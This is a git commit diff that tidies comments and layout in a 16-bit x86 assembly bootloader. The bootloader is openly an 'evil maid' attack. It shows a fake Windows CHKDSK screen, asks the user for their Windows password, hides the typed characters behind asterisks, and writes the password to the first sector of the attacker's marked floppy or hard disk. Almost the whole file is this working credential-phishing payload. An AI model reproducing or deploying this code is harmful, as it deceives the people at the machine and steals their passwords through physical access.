5000eaf8caf7ff44cef62a4bbc21f009905a5af1
Alex Weber <alexwebr@gmail.com>
2012-09-20 22:41:00 -0500

    cleanup

--- bootloader.asm
+++ bootloader.asm
@@ -1,18 +1,16 @@
 [BITS 16]
 [ORG 0x7C00]
 jmp start
-disknum db 0x99 ; now the first four bytes are E9 81 01 99 so we can find the disk later
+disknum db 0x99 ; now the first four bytes are E9 81 01 99 so we can find the disk we booted from
+                ; we also reuse this spot in memory for the disk we identified as the boot disk
 
-%macro biosprint 1 ; This macro lets us print a message without manually loading
+%macro biosprint 1 ; A nice wrapper
 mov si, %1
 call puts
 %endmacro
 
-; memory map
-; 7C00 -> 7DFF = Code
-; 7C00 -> 7DFF = 
-
-puts: ; print string - expects that strings are terminated by a 0, and that SI po
+; print a string - expects that SI is pointing at our string
+puts:
   mov al, [si]
   cmp BYTE al, 0
   je exit
@@ -22,13 +20,15 @@ puts: ; print string - expects that strings are terminated by a 0, and that SI p
   exit:
    ret
 
-putc: ; Print a char to screen
+; print a char to screen - used by puts
+putc:
  mov ah, 0x0E
  mov bh, 0x00
  mov bl, 0x11
  int 0x10
  ret
 
+; Busy wait, waits about a second on my Atom notebook
 sleep:
  ;mov eax, dword 0xffffffff
  mov eax, 200
@@ -40,13 +40,23 @@ sleep:
   end:
    ret
 
-find_disk: ; assumes dl is the disk to read
+; Assumes that dl is the disk we want to try
+; 0x00 = first floppy
+; 0x01 = second floppy
+; 0x80 = first hard disk
+; 0x81 = second hard disk
+; Does not check CD-ROM, because we can't write back to it anyways
+; Loads first sector, and if successful, compares the fourth byte
+; (the first 3 are a jump the start of real code) against a known
+; value to identify the evil maid disk. Stores dl in [disknum] if
+; it finds the disk (so, if [disknum] is still 0x99, we didn't find it)
+find_disk:
  mov ah, 0x02 ; I want to read
  mov dh, 0x00 ; zeroeth head
  mov al, 0x01 ; I want to read one sector
  mov cx, 0x01 ; first sector, zero-eth track
- int 13h
- jc done_find_disk
+ int 0x13
+ jc done_find_disk ; carry bit is set on read error
   mov al, [0x8003]
   cmp al, 0x99
   jne done_find_disk
@@ -55,60 +65,52 @@ find_disk: ; assumes dl is the disk to read
   done_find_disk:
    ret
 
-; Declarations
+; Strings
 checkfs db 'Windows CHKDSK', 13, 10, '==============', 13, 10, 13, 10, 'Checking file system on C:', 0
 ntfs db 13, 10, 'The type of file system is NTFS.', 13, 10, 13, 10, 'One of your disks needs to be checked for consistency.', 13, 10, 13, 10,'Enter your Windows password to continue: ', 0
-rmchar db 8,' ',8,0
+rmchar db 8,' ',8,0 ; this emulates the action of pressing backspace
 checking db 13,10,13,10, 'Cheking volume C:', 13,10,'This may take a few minutes.',0
-ya db 'ok!',0
-no db 'no!',0
-looking db 'looking', 13, 10, 0
 
 start:
- mov ax, cs
- mov ax, 0
- mov ds, ax    ; This is because DS has a stupid value when it starts, so we just
- xor ax, ax
+ xor ax, ax ; we just want to use absolute addresses
+ mov ds, ax
  mov es, ax
 
  biosprint checkfs
  call sleep
  biosprint ntfs
 
-mov bp, 0x7E00; ; this is where we write our password, and will become the sector we write back
-keep_zeroing:
- mov [bp], BYTE 0x00
- inc bp
- cmp bp, 0x7FFF ; 512 bytes from 0x7E00
- jb keep_zeroing
-
-mov bp, 0x7E00
-readchar:
- mov ah, 00h
- int 0x16
- cmp al, 13
- je done_password
- cmp al, 8
- je backspace
- mov [bp], BYTE al
- inc bp
- mov al, '*'
- call putc
- jmp loop
- backspace:
-  biosprint rmchar
+ mov bp, 0x7E00; ; this is where we write our password, and will become the sector we write back
+ keep_zeroing:
   mov [bp], BYTE 0x00
-  dec bp
- loop:
-  jmp readchar
+  inc bp
+  cmp bp, 0x7FFF ; 512 bytes from 0x7E00
+  jb keep_zeroing
 
-done_password:
- biosprint checking
+ mov bp, 0x7E00
+ readchar:
+  mov ah, 00h
+  int 0x16
+  cmp al, 13
+  je done_password
+  cmp al, 8
+  je backspace
+  mov [bp], BYTE al
+  inc bp
+  mov al, '*'
+  call putc
+  jmp loop
+  backspace:
+   biosprint rmchar
+   mov [bp], BYTE 0x00
+   dec bp
+  loop:
+   jmp readchar
+  done_password:
+   biosprint checking
 
 mov bx, 0x8000 ; write sector to this part of memory
-
-
-mov dl, 0x00
+mov dl, 0x00   ; look for our disk
 call find_disk
 mov dl, 0x01
 call find_disk
@@ -117,20 +119,19 @@ call find_disk
 mov dl, 0x81
 call find_disk
 
+; if we found our disk, write our blanked sector with password
+; stored to that disk
 cmp BYTE [disknum], 0x99
 je end_find_disk
-  mov ah, 0x03 ; I want to write
-  mov al, 0x01 ; I want to read one sector
-  mov ch, 0x00 ; zeroeth track
-  mov cl, 0x01 ; first sector
-  mov bx, 0x7E00
-  mov dh, 0x00 ; zeroeth head
-  mov dl, [disknum]
-  int 13h
+ mov ah, 0x03 ; I want to write
+ mov al, 0x01 ; I want to write one sector
+ mov ch, 0x00 ; zeroeth track
+ mov cl, 0x01 ; first sector
+ mov bx, 0x7E00
+ mov dh, 0x00 ; zeroeth head
+ mov dl, [disknum]
+ int 0x13
 end_find_disk:
-
-last:
- jmp $
 
 times 510 - ($ - $$) db 0
 dw 0xAA55
